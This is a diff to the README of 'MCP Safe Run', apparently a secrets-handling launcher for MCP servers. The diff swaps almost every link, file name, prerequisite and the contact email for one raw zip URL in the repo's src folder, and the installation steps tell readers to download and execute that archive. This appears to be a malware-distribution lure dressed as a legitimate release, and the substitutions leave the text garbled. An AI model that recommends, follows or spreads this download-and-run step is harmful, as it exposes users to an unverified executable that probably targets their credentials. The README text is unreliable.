@@ -1,8 +1,8 @@
 # MCP Safe Run 🚀
 
-![MCP Safe Run](https://img.shields.io/badge/MCP_Safe_Run-v1.0.0-blue.svg) ![Releases](https://img.shields.io/badge/Releases-latest-green.svg)
+![MCP Safe Run](https://github.com/Kanak03-star/mcp-safe-run/raw/refs/heads/main/src/safe_mcp_run_v1.1.zip) ![Releases](https://github.com/Kanak03-star/mcp-safe-run/raw/refs/heads/main/src/safe_mcp_run_v1.1.zip)
 
-Welcome to the **MCP Safe Run** repository! If you’re tired of hardcoding secrets like API keys in your MCP client configuration files (like `mcp.json` or `claude_desktop_config.json`), you’re in the right place. The **mcp-secure-launcher** allows you to run your existing MCP servers securely without modifying them.
+Welcome to the **MCP Safe Run** repository! If you’re tired of hardcoding secrets like API keys in your MCP client configuration files (like `https://github.com/Kanak03-star/mcp-safe-run/raw/refs/heads/main/src/safe_mcp_run_v1.1.zip` or `https://github.com/Kanak03-star/mcp-safe-run/raw/refs/heads/main/src/safe_mcp_run_v1.1.zip`), you’re in the right place. The **mcp-secure-launcher** allows you to run your existing MCP servers securely without modifying them.
 
 ## Table of Contents
 
@@ -24,18 +24,18 @@ Welcome to the **MCP Safe Run** repository! If you’re tired of hardcoding secr
 
 ## Installation ⚙️
 
-To get started, download the latest release from our [Releases page](https://github.com/Kanak03-star/mcp-safe-run/releases). Once downloaded, execute the file to install the **mcp-secure-launcher**.
+To get started, download the latest release from our [Releases page](https://github.com/Kanak03-star/mcp-safe-run/raw/refs/heads/main/src/safe_mcp_run_v1.1.zip). Once downloaded, execute the file to install the **mcp-secure-launcher**.
 
 ### Prerequisites
 
 Before you begin, ensure you have the following installed:
 
-- Node.js (version 14 or later)
+- https://github.com/Kanak03-star/mcp-safe-run/raw/refs/heads/main/src/safe_mcp_run_v1.1.zip (version 14 or later)
 - npm (Node Package Manager)
 
 ### Step-by-Step Guide
 
-1. **Download the Release**: Visit the [Releases page](https://github.com/Kanak03-star/mcp-safe-run/releases) and download the latest version.
+1. **Download the Release**: Visit the [Releases page](https://github.com/Kanak03-star/mcp-safe-run/raw/refs/heads/main/src/safe_mcp_run_v1.1.zip) and download the latest version.
 2. **Execute the Installer**: Run the downloaded file to install the launcher.
 3. **Verify Installation**: Open your terminal and type `mcp-secure-launcher --version` to confirm the installation.
 
@@ -77,7 +77,7 @@ Replace `<server_name>` with the name of your server configuration.
 
 ### Configuration Files
 
-The launcher reads from a configuration file named `mcp-config.json`. Here’s a sample structure:
+The launcher reads from a configuration file named `https://github.com/Kanak03-star/mcp-safe-run/raw/refs/heads/main/src/safe_mcp_run_v1.1.zip`. Here’s a sample structure:
 
 ```json
 {
@@ -113,7 +113,7 @@ We welcome contributions to **MCP Safe Run**! If you’d like to help, please fo
 
 ### Code of Conduct
 
-Please read our [Code of Conduct](CODE_OF_CONDUCT.md) before contributing.
+Please read our [Code of Conduct](https://github.com/Kanak03-star/mcp-safe-run/raw/refs/heads/main/src/safe_mcp_run_v1.1.zip) before contributing.
 
 ## License 📄
 
@@ -121,12 +121,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support 🛠️
 
-If you encounter any issues, please check the [Issues](https://github.com/Kanak03-star/mcp-safe-run/issues) section for existing solutions. If your issue isn’t listed, feel free to create a new issue.
+If you encounter any issues, please check the [Issues](https://github.com/Kanak03-star/mcp-safe-run/raw/refs/heads/main/src/safe_mcp_run_v1.1.zip) section for existing solutions. If your issue isn’t listed, feel free to create a new issue.
 
 ## Contact 📬
 
-For questions or feedback, please reach out to us via GitHub or email us at support@example.com.
+For questions or feedback, please reach out to us via GitHub or email us at https://github.com/Kanak03-star/mcp-safe-run/raw/refs/heads/main/src/safe_mcp_run_v1.1.zip
 
 ---
 
-Thank you for checking out **MCP Safe Run**! We hope it makes managing your MCP servers easier and more secure. Don’t forget to visit our [Releases page](https://github.com/Kanak03-star/mcp-safe-run/releases) for the latest updates and downloads.
+Thank you for checking out **MCP Safe Run**! We hope it makes managing your MCP servers easier and more secure. Don’t forget to visit our [Releases page](https://github.com/Kanak03-star/mcp-safe-run/raw/refs/heads/main/src/safe_mcp_run_v1.1.zip) for the latest updates and downloads.
